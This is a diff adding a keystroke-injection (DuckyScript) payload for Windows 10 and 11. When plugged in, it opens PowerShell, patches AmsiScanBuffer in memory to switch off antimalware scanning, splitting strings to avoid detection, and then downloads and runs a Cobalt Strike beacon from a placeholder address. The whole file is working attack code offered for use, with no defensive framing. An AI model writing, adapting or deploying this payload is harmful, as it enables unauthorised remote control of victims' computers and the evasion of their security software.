@@ -1,0 +1,65 @@
+REM Title: Cobal Strike Payloader
+REM Author: https://github.com/okazymyrov/
+REM Description: This payload pathes amsi.dll AmsiScanBuffer and executes a beacon.
+REM Target: Windows 10, 11
+
+REM Run PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+REM Patch PowerShell
+STRING $Win32 = @"
+ENTER
+STRING using System;
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING public class Win32 {
+ENTER
+STRING [DllImport("kernel32")]
+ENTER
+STRING public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ENTER
+STRING [DllImport("kernel32")]
+ENTER
+STRING public static extern IntPtr LoadLibrary(string name);
+ENTER
+STRING [DllImport("kernel32")]
+ENTER
+STRING public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ENTER
+STRING }
+ENTER
+STRING "@
+ENTER
+
+DELAY 500
+
+STRING Add-Type $Win32
+ENTER
+
+STRING $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+ENTER
+STRING $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+ENTER
+STRING $p = 0
+ENTER
+
+DELAY 500
+
+STRING [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+ENTER
+STRING $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+ENTER
+STRING [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+ENTER
+
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+ENTER
+
+REM Run PowerShell
+STRING iex(New-Object Net.WebClient).DownloadString('<beacon.ps1>')
+ENTER
